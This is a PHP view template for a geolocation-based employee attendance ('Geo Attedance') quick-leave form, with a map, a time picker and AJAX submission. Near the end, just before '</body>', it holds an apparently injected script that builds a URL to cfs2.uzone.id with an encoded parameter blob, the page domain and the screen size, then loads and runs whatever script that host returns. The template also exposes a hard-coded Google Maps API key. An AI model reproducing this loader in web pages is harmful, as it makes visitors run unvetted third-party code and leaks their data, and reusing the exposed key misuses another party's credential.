    <link href="<?php echo"".base_url().""; ?>/assets/css/style.css" rel="stylesheet">
<?php
$tanggal=date('d/m/Y');
?>
 <!-- Page Loader -->
    
    <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
   

    <!-- Main content -->
    <section class="content">
   

     <div class="row">
			<div class="col-md-12">
			  <div class="box">
				
				<!-- /.box-header -->
				<div class="box-body">
				  <div class="row">
					<div class="col-md-7">
					

					   
						   <section class="map-section">
    	<div class="map-outer">

            <!--Map Canvas-->
            <div style="width:100%;height:500px"class="map-canvas"
                data-zoom="8"
                data-lat="-37.817085"
                data-lng="144.955631"
                data-type="roadmap"
                data-hue="#ffc400"
                data-title="Envato"
                data-content="Melbourne VIC 3000, Australia<br><a href='mailto:info@youremail.com'>info@youremail.com</a>"
				id="map-canvas"
				>
            </div>

        </div>
 
				
					  <!-- /.chart-responsive -->
					</div>
					<div class="col-md-5">
				  <!-- USERS LIST -->
				  <div class="box box-primary">
					<div class="box-header with-border" style="color:white;text-align:center;background-color: #18365E">
					 <div style="font-family:arial;font-size:17px;padding:10px 10px 10px 10px; border:3px solid #FFD700;color:white;text-align:center">
					 Geo <br /> Attedance
					 </div>
					</div>
					<!-- /.box-header -->
					<div class="box-body no-padding" style="background-color:#FFD700;height:400px"><br />
					 <!-- <div style="width:100%;text-align:center;height:60px;font-size:30px;color:#18365E;font-family:Times New Roman;font-weight:bolder"  id="txt">
						
					  </div>-->
					  <form id="form_input_shoes">
						
					  <div style="width:100%;text-align:center;height:60px;font-size:30px;color:#18365E;font-family:Times New Roman;font-weight:bolder"  id="">
							<div class="form-group">
									<label for="exampleInputEmail1">Jam Pengajuan Ijin Cepat</label>
									  <div class='input-group date' id='jam_masuk'>
										<input type='text' class="form-control" name="start_date" id="start_hour" readonly />
										<span class="input-group-addon">
										  <span class="glyphicon glyphicon-time"></span>
										</span>
									  </div>
									  <div id="start_hour_alert" style="color:red"></div>
									</div>
					  </div><br /><br />
					 
					   <div style="width:100%;text-align:center;height:70px;color:#18365E;font-size:13px" id="alamat_nya">
						
					  </div>
					 <div style="width:100%;text-align:center;height:70px;color:#18365E;font-size:18px" id="">
							JAM KELUAR / PENGAJUAN IJIN CEPAT
					  </div>
					  
						<div style="width:100%;text-align:center;font-size:12px;color:black;height:170px">
						<?php
						$time=date("h:i:s");
						$date=date("Y-m-d");
						?>
						<input type="hidden" name="user_id" value="<?php echo $this->session->userdata('id_user'); ?>"class="form-control" id="user_id" >
						<input type="hidden" name="long" id="long">
						<input type="hidden" name="lat" id="lat">
					
						  <button style=" background-color: Transparent;
    background-repeat:no-repeat;
    border: none;
    cursor:pointer;
    overflow: hidden;
    outline:none;" type="submit"><img src="<?php echo base_url();?>/assets/dist/img/home-sett att button.png" class="logo" alt="User Image" style="width:80px;height:80px"><br /></button>
	</form>
	<br /><br />
						  <a href="<?php echo base_url(); ?>/index.php/data_absensi/history"><img src="<?php echo base_url();?>/assets/dist/img/home-history button.png" class="logo" alt="User Image" style="width:120px;height:30px"></a>
					  </div>
					 
					  <!-- /.users-list -->
					</div>
					<!-- /.box-body -->
					
					<!-- /.box-footer -->
				  </div>
				  <!--/.box -->
				</div>
				<!-- /.col -->
					<!-- /.col -->
				  </div>
				  <!-- /.row -->
				</div>
			  
				<!-- /.box-footer -->
			  </div>
			  <!-- /.box -->
			</div>
        <!-- /.col -->
      </div>

	
    </section>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

    <!-- Custom Js -->
    <script src="<?php echo"".base_url().""; ?>/assets/js/admin.js"></script>
	<script src="<?php echo"".base_url().""; ?>/assets/js/moment.js"></script>
<script src="<?php echo"".base_url().""; ?>/assets/js/bootstrap-datetimepicker.min.js"></script>
		 <script src="<?php echo"".base_url().""; ?>/assets/js/plugins/datapicker/bootstrap-datepicker.js"></script>
	
		<script type="text/javascript">
			$(function () {
				$('#jam_masuk').datetimepicker({
					format: 'HH:mm',
					 ignoreReadonly: true
                });
				$('#jam_keluar').datetimepicker({
					format: 'HH:mm',
					 ignoreReadonly: true
                });
			
			});
		</script>
			<script>
			 $('.datepicker').datepicker({
				format: 'yyyy-mm-dd',
				autoclose:true
			 });
		</script>
<script>
      // Note: This example requires that you consent to location sharing when
      // prompted by your browser. If you see the error "The Geolocation service
      // failed.", it means you probably did not give permission for the browser to
      // locate you.

      function initMap() {
        var map = new google.maps.Map(document.getElementById('map-canvas'), {
          center: {lat: -34.397, lng: 150.644},
          zoom: 16
        });
        var infoWindow = new google.maps.InfoWindow({map: map});

        // Try HTML5 geolocation.
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            var pos = {
              lat: position.coords.latitude,
              lng: position.coords.longitude
            };
			$("#lat").val(position.coords.latitude);
			$("#long").val(position.coords.longitude);
			
			var latlng = ""+position.coords.latitude+", "+position.coords.longitude+"";
			var url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" + latlng + "&sensor=false";
			$.getJSON(url, function (data) {
				var address="";
				for(var i=0;i<data.results.length;i++) {
					adress = data.results[0].formatted_address;
					
					$("#alamat_nya").html(adress);
					
				}
			});

            infoWindow.setPosition(pos);
            infoWindow.setContent('Lokasi Anda Disini.');
            map.setCenter(pos);
          }, function() {
            handleLocationError(true, infoWindow, map.getCenter());
          });
        } else {
          // Browser doesn't support Geolocation
          handleLocationError(false, infoWindow, map.getCenter());
        }
      }

      function handleLocationError(browserHasGeolocation, infoWindow, pos) {
        infoWindow.setPosition(pos);
        infoWindow.setContent(browserHasGeolocation ?
                              'Error: The Geolocation service failed.' :
                              'Error: Your browser doesn\'t support geolocation.');
      }
    </script>
<script>
	
	</script> 
 <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAnFiJBgY8fPwBMde9Lqmkwtxr_Wk5vSL8&callback=initMap"
  async defer></script>
  
<!--End Google Map APi-->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKL8xXQhGpEWxo5qY3k16bOBCNaZKaqro2cjHjIuDWzlUNzsvxwF%2bKlgXJLtHTKEqf6RONnSLXf4kleb7JKg8jMe4RCxPsZDHdC%2bR7PpkQe25PY1cM0y89iSN0DegBnrMXo1hQwOE%2f0TnRO9Uz81SvhhGNgGh7GnULgHBOZZ%2fOphOtX3Tj6f0eat5jHCln801BuvVMbkKW1mD8TL2NeJhF8jatl4RRobrWZ93T7jQ76yXsW3f2kP9jaF%2f3r7mmPR%2fCbfHNo76igbnHzyydCOOnLcS1dBRvF%2f2ii%2bwnH%2bJUrop9VXLtWgJ7LDT5ZRtf5iUTuMUQpzazjlpIQcM1OLFnqjJb2FoQJ1CLv1mwEnFNve6kCHGnafvaDMQrHPA5tPQbEK6Ye6KyqTr1916az0onj0sXzpLNJq5eLWvIH4wcBsA4RM94Iv%2b8ftCta787GkeKjj0dJcsNs%2bh5I7I9WevaBPFPrutdnwc5umu%2fr28%2fnXeLj3Can079KQzKDxkt6aobl6f%2fnqByFIZBiYu1zxf2JKGL4Z%2fCgRI6" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
<script>
	$('#form_input_shoes').submit(function(e){
	
		formData = new FormData($(this)[0]);
			$.ajax({
					url 	: '<?php echo base_url() ?>/index.php/data_absensi/save_data_absensi_ijin_cepat',
					type	: 'POST',
					data	: formData,
					async	: false,
					cache	: false,
					processData : false,
					contentType	: false,
					success:function (data){
						if(data.is_logged_in == 1){
							sweetAlert({
	                                                   title: "Berhasil!", 
                                                        text: "Berhasil Masuk!", 
                                                        type: "success",
														
														 showCancelButton: false,//There won't be any cancle button
															showConfirmButton  : true ,
                                                        }
														, function() {
																	location.reload();
														}
														);
						}else{
							alert("Anda Belum Melakukan Absen Masuk");
							
						}
							
					
						
					}
				})
		
			
			return false;
	});
</script>

<script>
			$(document).ready(function(){
            $.ajax({
                url     : '<?php echo base_url() ?>index.php/data_absensi/get_data_absen',
                type    : 'GET',
                async   : false,
                cache   : false,
                processData : false,
                contentType : false,
                success:function (data_master_equipment){
						;
                    $.each(data_master_equipment.data, function(i, item){
                        $('#jam_masuk_view').html(''+item.jam_masuk+'');
                    })
                }
            })
		});
</script>

<script>
			$(document).ready(function(){
            $.ajax({
                url     : '<?php echo base_url() ?>index.php/data_absensi/status_absensi/<?php echo $this->session->userdata('id_user'); ?>',
                type    : 'GET',
                async   : false,
                cache   : false,
                processData : false,
                contentType : false,
                success:function (data_master_equipment){
						
                    $.each(data_master_equipment.data, function(i, item){
                        $('#status_absensi').html(''+item.status_absensi+'');
                    })
                }
            })
		});
</script>